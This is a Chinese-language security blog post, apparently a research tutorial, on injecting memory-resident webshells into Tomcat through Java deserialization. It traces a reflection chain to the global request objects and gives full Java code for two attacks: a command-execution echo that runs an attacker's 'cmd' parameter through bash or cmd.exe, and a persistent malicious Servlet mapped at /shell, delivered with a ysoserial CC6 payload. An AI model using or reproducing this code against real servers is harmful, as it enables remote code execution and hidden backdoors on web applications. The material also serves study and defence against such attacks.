## 前言

对于回显的获取主要是在`ApplicationFilterChain`类的`lastServicedRequest /
lastServicedResponse`两个属性，是使用的`ThreadLocal`进行修饰的，并且，在执行请求的过程中，通过反射修改属性值，能够记录下当前线程的request对象的值。

之后在反序列化利用过程中方便利用`ThreadLocal`取出对应的request进行内存马的注入关键步骤。

这里转而通过寻找全局存储的`request / response`进行内存马的注入操作。

## 正文

### 如何获取的回显

师傅通过这种方式关注到了`org.apache.coyote.AbstractProcessor`类中，存在有两个属性值名为`request /
response`分别是使用`final`修饰的`org.apache.coyote.Request /
org.apache.coyote.Response`类型的变量。

![image-20221102202506085.png](https://image.3001.net/images/20221117/1668679870_637608bef202e251abebe.png!small)

我们的目标是注入一个内存马，这里以上篇一样的Servlet内存马举例说明。

对于Servlet内存马，我们需要获取到对应`ServletContext`，但是在`org.apache.coyote.Request`类中，并没有直接可以获取的方法存在，我们可以关注到该类的`setNote`方法的实现。

![image-20221102202726283.png](https://image.3001.net/images/20221117/1668679877_637608c59f8f081186949.png!small)

这个方法是用来存放私有数据的，在其中举了一个例子，其中描述了对于该类的`notes`数组中的下标为1的位置是用来存放的`HttpServletRequest`对象的，值得注意的是其中的0-8序号存放的是`servlet
Container`中的数据，9-16序号存放的是`connector`这个组件的数据。

因为只要获取到了`HttpServletRequest`对象，也就能够调用`getServletContext`方法获取我们需要的上下文。

我们可以通过`getNote(1)`来获取，

好了，言归正传，转到获取request对象，

在一个Controller调用过程中，其中的`Http11Processor`类是继承了`AbstractProcessor`这个类的。

![image-20221102203538541.png](https://image.3001.net/images/20221117/1668679884_637608cc16d52f990eec0.png!small)

所以我们只需要获取到`Http11Processor`类对象，我们就能够成功获取到我们需要的request对象

目标放在调用`Http11Processor`之前是否对该对象进行持久化存储，或者直接点对其中的request对象进行了持久化存储

![image-20221102203804487.png](https://image.3001.net/images/20221117/1668679890_637608d2203aea965e914.png!small)

我们进而关注到了`AbstractProtocol$ConnectionHandler`类中，在调用`process`方法的过程中调用了`register`方法对processor对象进行了存储。

![image-20221102204331170.png](https://image.3001.net/images/20221117/1668679896_637608d841b3ca9222f5b.png!small)

传入的是`processor`，他到底是什么，我们可以追溯到该方法的开头，存在有来源。

![image-20221102204429536.png](https://image.3001.net/images/20221117/1668679901_637608ddd776d8fdc2d1a.png!small)

我们可以知道，这个`processor`对象是获取的是当前的Http11Processor对象，

对于`register`方法，我们可以跟进一下。

![image-20221102204648552.png](https://image.3001.net/images/20221117/1668679911_637608e7b38379ce5495d.png!small)

首先从processor中获取了`RequestInfo`对象的信息之后调用了`setGlobalProcessor`方法。

![image-20221102204926999.png](https://image.3001.net/images/20221117/1668679920_637608f01ffef09c6d370.png!small)

调用了`addRequestProcessor`方法进行添加。

![image-20221102205118001.png](https://image.3001.net/images/20221117/1668679927_637608f78021c7cb0fd06.png!small)

也即是，将其添加进入了`processors`这个List对象中，

![image-20221102205429353.png](https://image.3001.net/images/20221117/1668679934_637608fea74209138a10c.png!small)

所以现在我们的目的是获取到`AbstractProtocol$ConnectionHandler`类的`global`属性值，也即是获取到`AbstractProtocol`这个类对象。

在调用这一步之后看起，发现了在`CoyoteAdapter#service`方法中，存在有`Connector`对象的操作。

![image-20221102205905726.png](https://image.3001.net/images/20221117/1668679949_6376090d532f70792db3e.png!small)

对于`Connector`对象

![image-20221102210101134.png](https://image.3001.net/images/20221117/1668679955_63760913a53df9b7c7187.png!small)

这是一个connector组件的一个实现，

其中存在有一个`protocolHandler`属性，是一个`ProtocolHandler`类对象。

![image-20221102210232734.png](https://image.3001.net/images/20221117/1668679963_6376091bbb712fda0548d.png!small)

前面我们需要获取的是`AbstractProtocol`类对象，同样是实现了这个接口，

而且于HTTP连接相关的类都实现了这个接口的，

![image-20221102210520949.png](https://image.3001.net/images/20221117/1668679971_637609238534e5c91b6fa.png!small)

所以我们能够从该属性中获取到我们需要的`AbstractProtocol`对象值，

现在我们需要获取的对象就是一个Connector对象，

而对于连接器的创建，在tomcat容器进行启动的时候，将会调用`setConnector`方法将connector放在service中去，也即是`StandardService`类对象。

对于`StandardService`的获取，我们可以直接从当前线程中进行获取。

![image-20221102211439089.png](https://image.3001.net/images/20221117/1668680237_63760a2d04d0d1ffbd7e8.png!small)

这样，一条链子进行成了

总结一下：

`StandardService`==>`connector`==>`Connector.protocolHandler`==>`Http11NioProtocol.handler`==>`AbstractProtocol$ConnectionHandler.global`==>`RequestGroupInfo.processors`==>`RequestInfo.req`

### 构造回显内存马

#### 非持久化

这种应该也不算是内存马吧，也就是每次发送发序列化数据的时候，通过利用获取的request / response进行命令执行和回显。

对于实验的环境同样使用的是前面一样的环境 -- 使用springboot搭建的环境，

我首先创建了一个`getField`方法方便获取属性值。

![image-20221102212415649.png](https://image.3001.net/images/20221117/1668680244_63760a3476abc1cccbd7a.png!small)

将具体逻辑放在了static代码块中。

值得注意的有两点

  1. 在进行connector的筛选中，调用了`getScheme().toLowerCase().contains("http")`方法来帅选和http相关的连接器。

  2. 在命令执行的位置，通过判断有无特征来决定是否执行命令。

![image-20221102213238561.png](https://image.3001.net/images/20221117/1668680254_63760a3e45be6cfb9b726.png!small)

完整的实现

    
    
    // 从线程中获取类加载器WebappClassLoaderBase
                WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                // 获取TomcatEmbeddedContext对象
                Context context = contextClassLoader.getResources().getContext();
                // 从上下文中获取ApplicationContext对象
                ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));
    
                // 从Application中获取StandardService对象
                StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));
    
                // 从StandardService中获取Connector数组
                Connector[] connectors = standardService.findConnectors();
                for (Connector connector : connectors) {
                    if (connector.getScheme().toLowerCase().contains("http")) {
                        // 获取Connector对象的protocolHandler属性值
                        ProtocolHandler protocolHandler = connector.getProtocolHandler();
                        // 筛选我们需要的Abstract
                        if (protocolHandler instanceof AbstractProtocol) {
                            // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                            // 反射获取该方法
                            Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                            getHandler.setAccessible(true);
                            AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                            // 从上面获取的handler中取出global属性值
                            RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                            // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                            ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                            // 遍历List中的元素
                            for (Object processor : processors) {
                                RequestInfo requestInfo = (RequestInfo) processor;
                                // 获取对应的Request对象
                                org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                                // 通过不同的请求进行处理
                                if ((req.queryString()).toString().toLowerCase().contains("cmd")) {
                                    // 获取对应的Request对象
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
                                    // 执行希望执行的命令
                                    String cmd = request.getParameter("cmd");
                                    String[] cmds = null;
                                    if (cmd != null) {
                                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                            cmds = new String[] {"cmd.exe", "/c", cmd};
                                        } else {
                                            cmds = new String[] {"/bin/bash", "-c", cmd};
                                        }
                                        java.util.Scanner c = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A");
                                        String o = null;
                                        o = c.hasNext() ? c.next() : o;
                                        c.close();
                                        PrintWriter writer = request.getResponse().getWriter();
                                        writer.println(o);
                                        writer.flush();
                                        writer.close();
                                    }
                                }
    

测试一下

首先通过CC6_plus生成序列化数据`1.ser`

发送给漏洞端。

![image-20221102213721803.png](https://image.3001.net/images/20221117/1668680263_63760a47e8876c2832f33.png!small)

在访问路由中添加了一个cmd的GET传参，最后能够发现，成功执行了的。

####  **持久化**

对于持久化也就是真正的内存马实现，主要是通过和前面的Tomcat Servlet内存马相结合的模式，

也即是从request对象中获取到了ServletContext对象来执行恶意逻辑。

完整实现

    
    
    // 从线程中获取类加载器WebappClassLoaderBase
                WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                // 获取TomcatEmbeddedContext对象
                Context context = contextClassLoader.getResources().getContext();
                // 从上下文中获取ApplicationContext对象
                ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));
    
                // 从Application中获取StandardService对象
                StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));
    
                // 从StandardService中获取Connector数组
                Connector[] connectors = standardService.findConnectors();
                for (Connector connector : connectors) {
                    if (connector.getScheme().toLowerCase().contains("http")) {
                        // 获取Connector对象的protocolHandler属性值
                        ProtocolHandler protocolHandler = connector.getProtocolHandler();
                        // 筛选我们需要的Abstract
                        if (protocolHandler instanceof AbstractProtocol) {
                            // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                            // 反射获取该方法
                            Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                            getHandler.setAccessible(true);
                            AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                            // 从上面获取的handler中取出global属性值
                            RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                            // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                            ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                            // 遍历List中的元素
                            for (Object processor : processors) {
                                RequestInfo requestInfo = (RequestInfo) processor;
                                // 获取对应的Request对象
                                org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
    
                                ServletContext servletContext = request.getServletContext();
    
                                String name = "xxx";
                                if (servletContext.getServletRegistration(name) == null) {
                                    StandardContext o = null;
    
                                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                                    while (o == null) {
                                        Field f = servletContext.getClass().getDeclaredField("context");
                                        f.setAccessible(true);
                                        Object object = f.get(servletContext);
    
                                        if (object instanceof ServletContext) {
                                            servletContext = (ServletContext) object;
                                        } else if (object instanceof StandardContext) {
                                            o = (StandardContext) object;
                                        }
                                    }
    
                                    //自定义servlet
                                    Servlet servlet = new TomcatMemshell1();
    
                                    //用Wrapper封装servlet
                                    Wrapper newWrapper = o.createWrapper();
                                    newWrapper.setName(name);
                                    newWrapper.setLoadOnStartup(1);
                                    newWrapper.setServlet(servlet);
    
                                    //向children中添加Wrapper
                                    o.addChild(newWrapper);
                                    //添加servlet的映射
                                    o.addServletMappingDecoded("/shell", name);
    

简单测试一下，

启动反序列漏洞环境，

发送序列化数据，

![image-20221102214213112.png](https://image.3001.net/images/20221117/1668680275_63760a53f1019f0397341.png!small)

成功进行反序列化，

![image-20221102214235912.png](https://image.3001.net/images/20221117/1668680281_63760a59c869eb184cbf3.png!small)

验证是否成功注入，

![image-20221102214306886.png](https://image.3001.net/images/20221117/1668680287_63760a5fbd2dc99dd9679.png!small)

成功创建了一个恶意的Servlet。

## Ref

https://github.com/Litch1-v/ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java

https://xz.aliyun.com/t/7348

